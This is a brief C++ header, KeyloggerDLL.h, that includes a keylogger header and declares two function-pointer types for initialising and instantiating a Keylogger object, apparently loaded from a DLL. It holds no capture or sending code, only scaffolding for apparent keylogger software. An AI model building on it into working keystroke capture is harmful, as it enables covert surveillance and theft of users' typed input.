//KeyloggerDLL.h
#pragma once

#include <iostream>
#include <vector>
#include "DLDictionary.h"
#include "Keylogger.h"

typedef bool (* _initKeylogger)(Keylogger*);
typedef Keylogger* (* _instantiate)(void);